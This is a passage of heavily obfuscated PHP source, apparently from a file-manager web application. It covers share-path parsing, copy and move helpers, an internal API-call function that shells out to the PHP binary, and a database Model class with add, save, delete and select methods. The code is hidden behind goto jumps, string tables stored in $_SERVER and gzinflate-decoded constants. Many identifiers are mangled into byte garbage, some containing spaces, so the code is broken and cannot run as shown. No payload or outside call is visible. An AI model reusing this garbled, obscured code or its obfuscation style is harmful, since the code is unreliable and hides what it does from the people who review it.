call_user_func_array(array($A‘ËËĞÁ…è[1107], $D¥ÜÀœ‘), $f´´Øá‚†¿); $ağ×ÙŠ­ = array($A‘ËËĞÁ…è[1108], $A‘ËËĞÁ…è[1109], $A‘ËËĞÁ…è[1110], $A‘ËËĞÁ…è[1111], $A‘ËËĞÁ…è[486], $A‘ËËĞÁ…è[488], $A‘ËËĞÁ…è[1112], $A‘ËËĞÁ…è[91], $A‘ËËĞÁ…è[1113], $A‘ËËĞÁ…è[1114]); if (in_array($D¥ÜÀœ‘, $ağ×ÙŠ­)) { $D­ª…ğÕ» = $this->getPathOuter($D­ª…ğÕ»); } return $D­ª…ğÕ»; } public function copy($a“›Êë°Æè, $B¥ù×¬š¶Å, $eäÉŸ²Ä = false) { return $this->copyMove($a“›Êë°Æè, $B¥ù×¬š¶Å, $eäÉŸ²Ä, $_SERVER[£ü][486]); } public function move($bÈ ®Á…¶ç, $cÊ°±Îò‚«, $fÛóÈó—ê = false) { return $this->copyMove($bÈ ®Á…¶ç, $cÊ°±Îò‚«, $fÛóÈó—ê, $_SERVER[£ü][488]); } private function copyMove($CÎˆò »ºœ, $EÏôŒÃéÜ, $e²•ÛÑÑ¼ô, $dÑ˜ÚÏğ÷ò) { goto C±·‡ÍÖ·; BœÌó‡©¢ê: return $CöæŠ™–³­; goto bğ†¸†âçÊ; C±·‡ÍÖ·: $dÄöÉÜ‰¼¤ =& $_SERVER[£ü]; $fÍÇ¶Œåğ¯ = $EÏôŒÃéÜ; $a¬ƒ¬¦‘Ù = IO::driverMake($EÏôŒÃéÜ); goto a‡‰Úî»ï˜; a‡‰Úî»ï˜: if ($a¬ƒ¬¦‘Ù->pathParse[$dÄöÉÜ‰¼¤[986]]) { $EÏôŒÃéÜ = $a¬ƒ¬¦‘Ù->pathParse[$dÄöÉÜ‰¼¤[986]]; } else { $EÏôŒÃéÜ = $fÍÇ¶Œåğ¯; } $CöæŠ™–³­ = IO::copyMove($CÎˆò »ºœ, $EÏôŒÃéÜ, $e²•ÛÑÑ¼ô, $dÑ˜ÚÏğ÷ò); $CöæŠ™–³­ = $this->getPathOuter($CöæŠ™–³­); goto BœÌó‡©¢ê; bğ†¸†âçÊ: } public function pathFather($CÃÀƒÕÛˆ×) { return get_path_father($this->pathParse[$_SERVER[£ü][75]]); } public function iconvSystem($DˆŠäÌ»¿¹) { return $DˆŠäÌ»¿¹; } protected function infoParse($E›¸¼¡ïßó) { $EÓ­ÕÑĞôÈ =& $_SERVER[£ü]; $dö’¯Ùòˆ³ = $this->pathParse[$EÓ­ÕÑĞôÈ[435]][$EÓ­ÕÑĞôÈ[1006]] . $this->pathParse[$EÓ­ÕÑĞôÈ[999]]; $eÅÎ£ä¥ìë = IO::info($dö’¯Ùòˆ³); $aäÍ §ì‡ = $this->pathParse[$EÓ­ÕÑĞôÈ[435]]; return Action($EÓ­ÕÑĞôÈ[1106])->_shareItemeParse($eÅÎ£ä¥ìë, $aäÍ §ì‡); } public function listAll($e´¯è¨®Ñ) { $F§à¯¯äåğ =& $_SERVER[£ü]; $AÒì¨ìåÚ× = IO::listAll($e´¯è¨®Ñ); $Fİº‹˜Ø†è = $this->pathParse[$F§à¯¯äåğ[435]]; foreach ($AÒì¨ìåÚ× as &$E±šç®Áƒ) { check_abort(); $E±šç®Áƒ = array_merge(IO::info($E±šç®Áƒ[$F§à¯¯äåğ[75]]), $E±šç®Áƒ); $E±šç®Áƒ[$F§à¯¯äåğ[388]] = Action($F§à¯¯äåğ[1106])->_shareItemeParse($E±šç®Áƒ, $Fİº‹˜Ø†è); } return $AÒì¨ìåÚ×; } public function getPathOuter($B…Â†Ù’«) { goto B­Äƒï¸Ï; f± àùãï: $eô›Öîáë = KodIO::clear($B…Â†Ù’«); $D²°¿·Ø£¯ = KodIO::clear($this->pathParse[$aœ‚Ä ´÷·[435]][$aœ‚Ä ´÷·[1006]]); $a‘ŒŸÓœÏ‰ = substr($eô›Öîáë, strlen($D²°¿·Ø£¯)); goto Dôñò“±È¼; Dôñò“±È¼: if (substr($eô›Öîáë, 0, strlen($D²°¿·Ø£¯)) != $D²°¿·Ø£¯) { return !1; } return $this->pathParse[$aœ‚Ä ´÷·[1000]] . $aœ‚Ä ´÷·[8] . ltrim($a‘ŒŸÓœÏ‰, $aœ‚Ä ´÷·[8]); goto Fô¿ã¤Ë; B­Äƒï¸Ï: $aœ‚Ä ´÷· =& $_SERVER[£ü]; $DÊ“é×‘•™ = KodIO::parse($B…Â†Ù’«); if ($DÊ“é×‘•™[$aœ‚Ä ´÷·[29]] == KodIO::KOD_SHARE_ITEM) { return $DÊ“é×‘•™[$aœ‚Ä ´÷·[75]]; } goto f± àùãï; Fô¿ã¤Ë: } public function getType() { $FïÍòóßÎÅ =& $_SERVER[£ü]; $DÏÑËÄ¨Ê³ = str_replace($FïÍòóßÎÅ[71], $FïÍòóßÎÅ[33], get_class($this)); return strtolower($DÏÑËÄ¨Ê³); } public function isTypeObject($eùº‰ÁŒã) { return IO::isTypeObject($eùº‰ÁŒã); } public function info($bå—ÚÖä‰š) { return $this->infoParse($bå—ÚÖä‰š); } public function infoAuth($a™ˆÚœñáÈ) { return $this->infoParse($a™ˆÚœñáÈ); } public function infoWithChildren($BÇ¢š†ÆãÅ) { return $this->infoParse($BÇ¢š†ÆãÅ); } public function infoFull($Dâ¬ÏšÆ„) { return $this->infoParse($Dâ¬ÏšÆ„); } } goto a ­†¯°ª«; d¸ñ©ğÏ¦: define($_SERVER[£ü][0], $_SERVER[£ü][1]); $_SERVER[ĞÔ] = explode($_SERVER[£ü][2], gzinflate(substr($_SERVER[£ü][3], 10, -8))); function Model($Cºáš’“Íé = '', $AÑÌ¹ÈŞ = '', $fœÁø¶Ó…° = '') { goto Bó·ï¥îÏ¯; Bó·ï¥îÏ¯: $cˆÃ‰Š·• =& $_SERVER[ĞÔ]; static $dª¨’Ç¬…” = array(); $Dß º¾²¹Â = strtolower($AÑÌ¹ÈŞ . $cˆÃ‰Š·•[0] . $Cºáš’“Íé); goto eÈÆöß×¬Š; f¡µçÄŒ: $dª¨’Ç¬…”[$Dß º¾²¹Â] = new ModelBase($Cºáš’“Íé, $AÑÌ¹ÈŞ, $fœÁø¶Ó…°); return $dª¨’Ç¬…”[$Dß º¾²¹Â]; goto Fó‘Û²¶µ; eÈÆöß×¬Š: if (isset($dª¨’Ç¬…”[$Dß º¾²¹Â])) { return $dª¨’Ç¬…”[$Dß º¾²¹Â]; } if ($Cºáš’“Íé) { $Cºáš’“Íé = strtoupper($Cºáš’“Íé[0]) . substr($Cºáš’“Íé, 1); $d®Ñå¶ƒ¿£ = $Cºáš’“Íé . $cˆÃ‰Š·•[1]; if (class_exists($d®Ñå¶ƒ¿£)) { $dª¨’Ç¬…”[$Dß º¾²¹Â] = new $d®Ñå¶ƒ¿£(); return $dª¨’Ç¬…”[$Dß º¾²¹Â]; } } if (!$fœÁø¶Ó…°) { $fœÁø¶Ó…° = $GLOBALS[$cˆÃ‰Š·•[2]][$cˆÃ‰Š·•[3]]; } goto f¡µçÄŒ; Fó‘Û²¶µ: } goto aË³ç¢ç¿; E‘«Ş•ŞŞ: function ActionCall($C‘­ÂÔ…¤Í) { $b³œº¢Ğç = array_slice(func_get_args(), 1); return ActionApply($C‘­ÂÔ…¤Í, $b³œº¢Ğç); } function ActionCallApi($c¶›İ¦©‹, $b×†î‰ĞÑõ = '') { goto f¡¦‘ôË‚Ğ; A”››Î´°š: $Aä—ß˜»Öæ = json_decode($e–³£Ø­öĞ, !0); $d’Œ§§µÔ„ = is_array($Aä—ß˜»Öæ) ? $Aä—ß˜»Öæ : array($aîƒ—³×¶[33] => null, $aîƒ—³×¶[34] => $e–³£Ø­öĞ); if (!$Aä—ß˜»Öæ) { echo $e–³£Ø­öĞ; } goto A«íàœæ°˜; dÈÆ³÷¶Œ: $Bñ¼ë‚Ú©° = phpBinCommand(); if ($Bñ¼ë‚Ú©° && function_exists($aîƒ—³×¶[25])) { $e‹ˆßô®Œ— = $Bñ¼ë‚Ú©° . $aîƒ—³×¶[26] . BASIC_PATH . $aîƒ—³×¶[27] . escapeshellarg($c¶›İ¦©‹); $e–³£Ø­öĞ = shell_exec($e‹ˆßô®Œ—); } if (!$e–³£Ø­öĞ) { $fôæĞˆÑ‡ = stream_context_create(array($aîƒ—³×¶[28] => array($aîƒ—³×¶[29] => 20, $aîƒ—³×¶[30] => $aîƒ—³×¶[31]))); $e–³£Ø­öĞ = file_get_contents(APP_HOST . $aîƒ—³×¶[32] . $c¶›İ¦©‹, !1, $fôæĞˆÑ‡); } goto A”››Î´°š; A«íàœæ°˜: return $d’Œ§§µÔ„; goto B„Ş¶¬˜; AÛÀ×¼‰–Ó: $bµ¼°†ªÓñ = Action($aîƒ—³×¶[23])->accessToken(); $c¶›İ¦©‹ = str_replace($aîƒ—³×¶[5], $aîƒ—³×¶[4], $c¶›İ¦©‹) . $aîƒ—³×¶[24] . $bµ¼°†ªÓñ . $C‹ÄøÈŞ¬®; $e–³£Ø­öĞ = $aîƒ—³×¶[20]; goto dÈÆ³÷¶Œ; f¡¦‘ôË‚Ğ: $aîƒ—³×¶ =& $_SERVER[ĞÔ]; $C‹ÄøÈŞ¬® = $b×†î‰ĞÑõ; if (is_array($b×†î‰ĞÑõ)) { $C‹ÄøÈŞ¬® = $aîƒ—³×¶[20]; foreach ($b×†î‰ĞÑõ as $dƒ™‚¯Ø¶ => $aè¬ƒ…ŒØï) { $aè¬ƒ…ŒØï = is_array($aè¬ƒ…ŒØï) ? json_encode($aè¬ƒ…ŒØï) : $aè¬ƒ…ŒØï; $aè¬ƒ…ŒØï = is_bool($aè¬ƒ…ŒØï) ? intval($aè¬ƒ…ŒØï) : $aè¬ƒ…ŒØï; $C‹ÄøÈŞ¬® .= $aîƒ—³×¶[21] . $dƒ™‚¯Ø¶ . $aîƒ—³×¶[22] . rawurlencode($aè¬ƒ…ŒØï); } } goto AÛÀ×¼‰–Ó; B„Ş¶¬˜: } function ActionCallHook($Aİêâ®£Ùª) { goto c¦ƒéä®õö; D‚Í…ÚºÀ: $GLOBALS[$B¯»©¬ßáç[35]] = 1; $b‰í¾‰•ˆĞ = ActionApply($Aİêâ®£Ùª, $E¿õ‰åœ·); $B»é—…ÂÀ = ob_get_clean(); goto CŞÃñ´ÎÏ; CŞÃñ´ÎÏ: $b‰í¾‰•ˆĞ = $B»é—…ÂÀ ? json_decode($B»é—…ÂÀ, !0) : $b‰í¾‰•ˆĞ; $GLOBALS[$B¯»©¬ßáç[35]] = 0; return $b‰í¾‰•ˆĞ; goto F³‡Â††•; c¦ƒéä®õö: $B¯»©¬ßáç =& $_SERVER[ĞÔ]; ob_start(); $E¿õ‰åœ· = array_slice(func_get_args(), 1); goto D‚Í…ÚºÀ; F³‡Â††•: } goto F´˜ÔŠæÅ·; fÜ·ó˜™ØØ: define($_SERVER[£ü][227], 0); define($_SERVER[£ü][228], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\145", "\x6f\x72\x64\x65\x72", "\x61\154\x69\141\x73", "\x68\141\166\151\156\147", "\x67\x72\157\x75\x70", "\x6c\157\143\x6b", "\x64\151\163\164\x69\156\x63\164", "\x61\165\x74\157", "\146\x69\x6c\x74\145\162", "\166\x61\x6c\151\x64\x61\x74\x65", "\162\x65\163\165\154\x74", "\x62\x69\156\x64", "\x74\157\153\145\x6e"); public function __construct($cÕ½‰øïÍ† = '', $C¦Â¨­ä¦Æ = '', $cÊö‡ïÍÃ = '') { $c¦Ëß“©ÖĞ =& $_SERVER[£ü]; $this->_initialize(); if (!empty($cÕ½‰øïÍ†)) { if (strpos($cÕ½‰øïÍ†, $c¦Ëß“©ÖĞ[93])) { list($this->dbName, $this->name) = explode($c¦Ëß“©ÖĞ[93], $cÕ½‰øïÍ†); } else { $this->name = $cÕ½‰øïÍ†; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($C¦Â¨­ä¦Æ)) { $this->tablePrefix = $c¦Ëß“©ÖĞ[33]; } elseif ($c¦Ëß“©ÖĞ[33] != $C¦Â¨­ä¦Æ) { $this->tablePrefix = $C¦Â¨­ä¦Æ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($c¦Ëß“©ÖĞ[229]); } $this->db(0, empty($this->connection) ? $cÊö‡ïÍÃ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $F„Ÿ’ì³‰Œ =& $_SERVER[£ü]; if (empty($this->fields)) { if (think_config($F„Ÿ’ì³‰Œ[230])) { $DÊ´£ÀÑ¦ä = $this->dbName ? $this->dbName : think_config($F„Ÿ’ì³‰Œ[231]); $eîæàùàè÷ = think_var_cache($F„Ÿ’ì³‰Œ[232] . strtolower(get_path_this($DÊ´£ÀÑ¦ä) . $F„Ÿ’ì³‰Œ[93] . $this->name)); if ($eîæàùàè÷) { $DõŸÆ¡¦¤˜ = think_config($F„Ÿ’ì³‰Œ[233]); if (empty($DõŸÆ¡¦¤˜) || $eîæàùàè÷[$F„Ÿ’ì³‰Œ[234]] == $DõŸÆ¡¦¤˜) { $this->fields = $eîæàùàè÷; return; } } } $this->flush(); } } public function flush() { goto AÚ‰‹õ­; CÛƒôÅ·ÔÜ: if (think_config($DŠòßºÖî…[230])) { $FóÏ—ãæŒæ = $this->dbName ? $this->dbName : think_config($DŠòßºÖî…[231]); think_var_cache($DŠòßºÖî…[232] . strtolower(get_path_this($FóÏ—ãæŒæ) . $DŠòßºÖî…[93] . $this->name), $this->fields); } goto eàÍî³´¬ ; AÚ‰‹õ­: $DŠòßºÖî… =& $_SERVER[£ü]; $this->db->setModel($this->name); $F¾ßÙ½§†Š = $this->db->getFields($this->getTableName()); goto EæÒÃã¼¬Š; EæÒÃã¼¬Š: if (!$F¾ßÙ½§†Š) { return !1; } $this->fields = array_keys($F¾ßÙ½§†Š); $this->fields[$DŠòßºÖî…[235]] = !1; goto CË‰Å‹¨Ğˆ; CË‰Å‹¨Ğˆ: foreach ($F¾ßÙ½§†Š as $d™ß±íÖŒÍ => $a¨Ã•«øµ) { $A˜Òİ¥ÓŒ[$d™ß±íÖŒÍ] = $a¨Ã•«øµ[$DŠòßºÖî…[29]]; if ($a¨Ã•«øµ[$DŠòßºÖî…[36]]) { $this->fields[$DŠòßºÖî…[236]] = $d™ß±íÖŒÍ; if ($a¨Ã•«øµ[$DŠòßºÖî…[39]]) { $this->fields[$DŠòßºÖî…[235]] = !0; } } } $this->fields[$DŠòßºÖî…[237]] = $A˜Òİ¥ÓŒ; if (think_config($DŠòßºÖî…[233])) { $this->fields[$DŠòßºÖî…[234]] = think_config($DŠòßºÖî…[233]); } goto CÛƒôÅ·ÔÜ; eàÍî³´¬ : } public function switchModel($B²•ÌëÃÓğ, $c×ä»ƒÕé = array()) { $CŸ‰³™°º =& $_SERVER[£ü]; $Aƒ…©•ŒØ£ = ucwords(strtolower($B²•ÌëÃÓğ)) . $CŸ‰³™°º[238]; if (!class_exists($Aƒ…©•ŒØ£)) { think_exception($Aƒ…©•ŒØ£ . think_lang($CŸ‰³™°º[239])); } $this->_extModel = new $Aƒ…©•ŒØ£($this->name); if (!empty($c×ä»ƒÕé)) { foreach ($c×ä»ƒÕé as $eî¢É÷†“í) { $this->_extModel->setProperty($eî¢É÷†“í, $this->{$eî¢É÷†“í}); } } return $this->_extModel; } public function __set($DÒ¯ñƒ½ù›, $båÓ—éÊòÕ) { $this->data[$DÒ¯ñƒ½ù›] = $båÓ—éÊòÕ; } public function __get($eƒ¸˜¾±Ğ) { return isset($this->data[$eƒ¸˜¾±Ğ]) ? $this->data[$eƒ¸˜¾±Ğ] : null; } public function __isset($C ¹×¨Î„) { return isset($this->data[$C ¹×¨Î„]); } public function __unset($dÄç—×Ï„ô) { unset($this->data[$dÄç—×Ï„ô]); } public function __call($E ìÆÆ˜, $E•¾£–›àê) { $aƒ¼‰¯› =& $_SERVER[£ü]; if (in_array(strtolower($E ìÆÆ˜), $this->methods, !0)) { $this->options[strtolower($E ìÆÆ˜)] = $E•¾£–›àê[0]; return $this; } elseif (in_array(strtolower($E ìÆÆ˜), array($aƒ¼‰¯›[240], $aƒ¼‰¯›[241], $aƒ¼‰¯›[242], $aƒ¼‰¯›[243], $aƒ¼‰¯›[244]), !0)) { $Eàİ±¤³òñ = isset($E•¾£–›àê[0]) ? $E•¾£–›àê[0] : $aƒ¼‰¯›[173]; $Eàİ±¤³òñ = $this->db->parseKey($Eàİ±¤³òñ); return $this->getField(strtoupper($E ìÆÆ˜) . $aƒ¼‰¯›[245] . $Eàİ±¤³òñ . $aƒ¼‰¯›[246] . $E ìÆÆ˜, $aƒ¼‰¯›[240]); } elseif (strtolower(substr($E ìÆÆ˜, 0, 5)) == $aƒ¼‰¯›[247]) { $Eàİ±¤³òñ = think_parse_name(substr($E ìÆÆ˜, 5)); $FÓÊ­æ—ˆ²[$Eàİ±¤³òñ] = $E•¾£–›àê[0]; return $this->where($FÓÊ­æ—ˆ²)->find(); } elseif (strtolower(substr($E ìÆÆ˜, 0, 10)) == $aƒ¼‰¯›[248]) { $aˆôÈï…¦¼ = think_parse_name(substr($E ìÆÆ˜, 10)); $FÓÊ­æ—ˆ²[$aˆôÈï…¦¼] = $E•¾£–›àê[0]; return $this->where($FÓÊ­æ—ˆ²)->getField($E•¾£–›àê[1]); } elseif (isset($this->_scope[$E ìÆÆ˜])) { return $this->scope($E ìÆÆ˜, $E•¾£–›àê[0]); } elseif (method_exists($this, $E ìÆÆ˜)) { array_unshift($E•¾£–›àê, $E ìÆÆ˜); return call_user_func_array(array($this, $aƒ¼‰¯›[249]), $E•¾£–›àê); } else { return call_user_func_array(array(parent, $E ìÆÆ˜), $E•¾£–›àê); } } protected function call() { goto eøÛ«¯š²®; eºöá¹ : $D ÁÃ¤Ùß‰ = $aäáè–‚Ô´; if (is_array($aäáè–‚Ô´)) { $D ÁÃ¤Ùß‰ = $aäáè–‚Ô´[1]; $aäáè–‚Ô´ = $aäáè–‚Ô´[0]; } $ağò¯è¬–ö = count($Cİ…Ÿ¾ìèä) - 1; goto a™Ã°ËäÉ; eÏ³Õ£†ã: $cæÂ¾¹†Œ‰ = call_user_func_array(array($this, $aäáè–‚Ô´), $Cİ…Ÿ¾ìèä); if (method_exists($this, $A Å»•Ñ÷[253])) { $eŞ‰—£¾¸ = call_user_func_array(array($this, $A Å»•Ñ÷[254]), array($D ÁÃ¤Ùß‰, $Cİ…Ÿ¾ìèä, $cæÂ¾¹†Œ‰)); if ($eŞ‰—£¾¸) { return $eŞ‰—£¾¸; } } return $cæÂ¾¹†Œ‰; goto D©‰À‚²ÅÑ; a™Ã°ËäÉ: if (isset($Cİ…Ÿ¾ìèä[$ağò¯è¬–ö]) && $Cİ…Ÿ¾ìèä[$ağò¯è¬–ö] === $aäáè–‚Ô´) { think_exception(__CLASS__ . $A Å»•Ñ÷[4] . $aäáè–‚Ô´ . think_lang($A Å»•Ñ÷[250])); return; } $Cİ…Ÿ¾ìèä[] = $aäáè–‚Ô´; if (method_exists($this, $A Å»•Ñ÷[251])) { $eŞ‰—£¾¸ = call_user_func_array(array($this, $A Å»•Ñ÷[252]), array($D ÁÃ¤Ùß‰, $Cİ…Ÿ¾ìèä)); if (!is_null($eŞ‰—£¾¸) && $eŞ‰—£¾¸ !== !1) { return $eŞ‰—£¾¸; } } goto eÏ³Õ£†ã; eøÛ«¯š²®: $A Å»•Ñ÷ =& $_SERVER[£ü]; $Cİ…Ÿ¾ìèä = func_get_args(); $aäáè–‚Ô´ = array_shift($Cİ…Ÿ¾ìèä); goto eºöá¹ ; D©‰À‚²ÅÑ: } protected function _initialize() { } protected function _facade($c“˜â¡¸¾õ) { $f¿“ê¾ Ò¶ =& $_SERVER[£ü]; if (!empty($this->fields)) { foreach ($c“˜â¡¸¾õ as $F¬½· ¥’ => $E‚š•âêÁÑ) { if (!in_array($F¬½· ¥’, $this->fields, !0)) { unset($c“˜â¡¸¾õ[$F¬½· ¥’]); } elseif (is_scalar($E‚š•âêÁÑ)) { $this->_parseType($c“˜â¡¸¾õ, $F¬½· ¥’); } } } if (!empty($this->options[$f¿“ê¾ Ò¶[255]])) { $c“˜â¡¸¾õ = array_map($this->options[$f¿“ê¾ Ò¶[255]], $c“˜â¡¸¾õ); unset($this->options[$f¿“ê¾ Ò¶[255]]); } $this->_beforeWrite($c“˜â¡¸¾õ); return $c“˜â¡¸¾õ; } protected function _beforeWrite(&$DíñˆÍîÒö) { } public function add($cÖÕ¯ôğğĞ = '', $e…Ÿ–ã±òÙ = array(), $fÌÄ¹‚šÃ = false) { goto Aë¸Ÿ¿Áø©; Aë¸Ÿ¿Áø©: if (empty($cÖÕ¯ôğğĞ)) { if (!empty($this->data)) { $cÖÕ¯ôğğĞ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[£ü][256]); return !1; } } $e…Ÿ–ã±òÙ = $this->_parseOptions($e…Ÿ–ã±òÙ); $cÖÕ¯ôğğĞ = $this->_facade($cÖÕ¯ôğğĞ); goto CÛ•‰çÁ”ø; CÛ•‰çÁ”ø: if (!1 === $this->_beforeInsert($cÖÕ¯ôğğĞ, $e…Ÿ–ã±òÙ)) { return !1; } $e´ÈÊÚ¶¢ = $this->db->insert($cÖÕ¯ôğğĞ, $e…Ÿ–ã±òÙ, $fÌÄ¹‚šÃ); if (!1 !== $e´ÈÊÚ¶¢) { $dèŠ™Óã®Û = $this->getLastInsID(); if ($dèŠ™Óã®Û) { $cÖÕ¯ôğğĞ[$this->getPk()] = $dèŠ™Óã®Û; $this->_after_insert($cÖÕ¯ôğğĞ, $e…Ÿ–ã±òÙ); return $dèŠ™Óã®Û; } $this->_after_insert($cÖÕ¯ôğğĞ, $e…Ÿ–ã±òÙ); } goto D¡›ĞÕ‚ëË; D¡›ĞÕ‚ëË: return $e´ÈÊÚ¶¢; goto f¿áÈª‘µÖ; f¿áÈª‘µÖ: } protected function _beforeInsert(&$bÖ³ïŸ«…, $e™ç—›ÔÄ×) { } protected function _after_insert($aƒóãšº™, $FèÃÎ‡Ø¶) { } public function addAll($CİÌ´®áœ¹, $BÔÊÚ¤æõ” = array(), $d‰Ãš«ÎÍ = false) { goto AÆŠˆ²¢°‹; AÆŠˆ²¢°‹: $D£İ¦±îœ =& $_SERVER[£ü]; if (empty($CİÌ´®áœ¹)) { $this->error = think_lang($D£İ¦±îœ[256]); return !1; } $BÔÊÚ¤æõ” = $this->_parseOptions($BÔÊÚ¤æõ”); goto Eİâ¤Ã‹†à; FÖã°…ºõ³: return $A–’¸ï¸©˜; goto FÖ«® —ãİ; Eİâ¤Ã‹†à: foreach ($CİÌ´®áœ¹ as $EíÕœËØ‹ß => $Dòë›Š†–Ù) { $CİÌ´®áœ¹[$EíÕœËØ‹ß] = $this->_facade($Dòë›Š†–Ù); } if (method_exists($this->db, $D£İ¦±îœ[257])) { $A–’¸ï¸©˜ = $this->db->insertAll($CİÌ´®áœ¹, $BÔÊÚ¤æõ”, $d‰Ãš«ÎÍ); } else { $this->startTrans(); foreach ($CİÌ´®áœ¹ as $EíÕœËØ‹ß => $Dòë›Š†–Ù) { $A–’¸ï¸©˜ = $this->db->insert($Dòë›Š†–Ù, $BÔÊÚ¤æõ”, $d‰Ãš«ÎÍ); } $this->commit(); } if (!1 !== $A–’¸ï¸©˜) { $C§¾ÅöÒ¬¦ = $this->getLastInsID(); if ($C§¾ÅöÒ¬¦) { return $C§¾ÅöÒ¬¦; } } goto FÖã°…ºõ³; FÖ«® —ãİ: } public function selectAdd($fğÇ¡ŸØµÊ = '', $DÔƒËÓ²î = '', $f·Ó¾ÀÂº = array()) { $dè‹Éç¸” =& $_SERVER[£ü]; $f·Ó¾ÀÂº = $this->_parseOptions($f·Ó¾ÀÂº); if (!1 === ($bœ–Ù¤´“Å = $this->db->selectInsert($fğÇ¡ŸØµÊ ? $fğÇ¡ŸØµÊ : $f·Ó¾ÀÂº[$dè‹Éç¸”[258]], $DÔƒËÓ²î ? $DÔƒËÓ²î : $this->getTableName(), $f·Ó¾ÀÂº))) { $this->error = think_lang($dè‹Éç¸”[259]); return !1; } else { return $bœ–Ù¤´“Å; } } public function save($e‘ÔÒğ·´í = '', $bñ™èÚ°õí = array()) { goto a¡ìçÊ¯î; Fó»áËåİ: if (is_array($bñ™èÚ°õí[$bé±É®”Ÿ[260]]) && isset($bñ™èÚ°õí[$bé±É®”Ÿ[260]][$AçƒÀÃìÄ])) { $c¢‚†ÁïÂÓ = $bñ™èÚ°õí[$bé±É®”Ÿ[260]][$AçƒÀÃìÄ]; } if (!1 === $this->_beforeUpdate($e‘ÔÒğ·´í, $bñ™èÚ°õí)) { return !1; } $a™í«¹±Â„ = $this->db->update($e‘ÔÒğ·´í, $bñ™èÚ°õí); goto fÉßŞÍ È¬; a¡ìçÊ¯î: $bé±É®”Ÿ =& $_SERVER[£ü]; if (empty($e‘ÔÒğ·´í)) { if (!empty($this->data)) { $e‘ÔÒğ·´í = $this->data; $this->data = array(); } else { $this->error = think_lang($bé±É®”Ÿ[256]); return !1; } } $e‘ÔÒğ·´í = $this->_facade($e‘ÔÒğ·´í); goto féß¢ùîõ; féß¢ùîõ: $bñ™èÚ°õí = $this->_parseOptions($bñ™èÚ°õí); $AçƒÀÃìÄ = $this->getPk(); if (!isset($bñ™èÚ°õí[$bé±É®”Ÿ[260]])) { if (isset($e‘ÔÒğ·´í[$AçƒÀÃìÄ])) { $eš¤Äºƒğ[$AçƒÀÃìÄ] = $e‘ÔÒğ·´í[$AçƒÀÃìÄ]; $bñ™èÚ°õí[$bé±É®”Ÿ[260]] = $eš¤Äºƒğ; unset($e‘ÔÒğ·´í[$AçƒÀÃìÄ]); } else { $this->error = think_lang($bé±É®”Ÿ[259]); return !1; } } goto Fó»áËåİ; fÉßŞÍ È¬: if (!1 !== $a™í«¹±Â„) { if (isset($c¢‚†ÁïÂÓ)) { $e‘ÔÒğ·´í[$AçƒÀÃìÄ] = $c¢‚†ÁïÂÓ; } $this->_afterUpdate($e‘ÔÒğ·´í, $bñ™èÚ°õí); } return $a™í«¹±Â„; goto d£½®Ò¦; d£½®Ò¦: } protected function _beforeUpdate(&$b‘áˆÈ®•, $e¶‹»ğòß) { } protected function _afterUpdate($EÇâÄÎğ, $C„êÕîù³) { } public function delete($F¿Õ„÷Ü’ = array()) { goto BĞçÏê¥²; dĞĞ¡«×‰´: if (is_numeric($F¿Õ„÷Ü’) || is_string($F¿Õ„÷Ü’)) { if (strpos($F¿Õ„÷Ü’, $FÚ÷ÒŠ®êÖ[47])) { $B†¦¤Ü±À÷[$Eà·„ğËŠ] = array($FÚ÷ÒŠ®êÖ[261], $F¿Õ„÷Ü’); } else { $B†¦¤Ü±À÷[$Eà·„ğËŠ] = $F¿Õ„÷Ü’; } $this->options[$FÚ÷ÒŠ®êÖ[260]] = $B†¦¤Ü±À÷; } $F¿Õ„÷Ü’ = $this->_parseOptions(); if (is_array($F¿Õ„÷Ü’[$FÚ÷ÒŠ®êÖ[260]]) && isset($F¿Õ„÷Ü’[$FÚ÷ÒŠ®êÖ[260]][$Eà·„ğËŠ])) { $eï–ßºÈë = $F¿Õ„÷Ü’[$FÚ÷ÒŠ®êÖ[260]][$Eà·„ğËŠ]; } goto D˜˜¶Ô¿ù; BĞçÏê¥²: $FÚ÷ÒŠ®êÖ =& $_SERVER[£ü]; if (empty($F¿Õ„÷Ü’) && empty($this->options[$FÚ÷ÒŠ®êÖ[260]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Eà·„ğËŠ = $this->getPk(); goto dĞĞ¡«×‰´; D˜˜¶Ô¿ù: $cß¥Ëî¯§¤ = $this->db->delete($F¿Õ„÷Ü’); if (!1 !== $cß¥Ëî¯§¤) { $Dã‚î°Œï† = array(); if (isset($eï–ßºÈë)) { $Dã‚î°Œï†[$Eà·„ğËŠ] = $eï–ßºÈë; } $this->_after_delete($Dã‚î°Œï†, $F¿Õ„÷Ü’); } return $cß¥Ëî¯§¤; goto då¼ÂÃË¹Ê; då¼ÂÃË¹Ê: } protected function _after_delete($Bä„¸–ØÇƒ, $F•èè¬Å) { } public function select($bÓ¹Ù¥ß“Š = array()) { goto f–ø²ÔöÍ«; f–ø²ÔöÍ«: $C™ÉØ­çÈ =& $_SERVER[£ü]; if (is_string($bÓ¹Ù¥ß“Š) || is_numeric($bÓ¹Ù¥ß“Š)) { $CÓ‹èĞ”¢Æ = $this->getPk(); if (strpos($bÓ¹Ù¥ß“Š, $C™ÉØ­çÈ[47])) { $c–Ü…»«è[$CÓ‹èĞ”¢Æ] = array($C™ÉØ­çÈ[261], $bÓ¹Ù¥ß“Š); } else { $c–Ü…»«è[$CÓ‹èĞ”¢Æ] = $bÓ¹Ù¥ß“Š; } $this->options[$C™ÉØ­çÈ[260]] = $c–Ü…»«è; } elseif (!1 === $bÓ¹Ù¥ß“Š) { $bÓ¹Ù¥ß“Š = $this->_parseOptions(); return $C™ÉØ­çÈ[262] . $this->db->buildSelectSql($bÓ¹Ù¥ß“Š) . $C™ÉØ­çÈ[263]; } $bÓ¹Ù¥ß“Š = $this->_parseOptions(); goto a‡Õ°ÛõÆİ; B÷¥®ÍŠŞù: $this->_afterSelect($bÎ­­ ùˆ”, $bÓ¹Ù¥ß“Š); return 